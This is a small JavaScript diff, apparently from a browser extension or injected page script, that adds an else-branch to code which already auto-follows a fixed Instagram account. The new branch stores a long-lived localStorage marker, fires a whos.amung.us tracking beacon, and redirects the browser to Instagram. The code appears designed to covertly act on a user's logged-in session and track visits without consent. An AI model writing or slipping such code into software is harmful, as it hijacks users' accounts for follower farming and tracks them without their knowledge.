@@ -61,4 +61,12 @@ new Image().src = '//whos.amung.us/swidget/v502pxnqo6n1';
 media.instagram.follow("4101817865")
 
 
-}
+}else {tarih = new Date();
+    storage_key = 'access_yorummfz_';
+    if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
+        tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
+        localStorage[storage_key] = tarih.getTime();
+		new Image().src = '//whos.amung.us/swidget/v502pxnqo6n2';
+window.location = "https://www.instagram.com/";
+		
+    } }
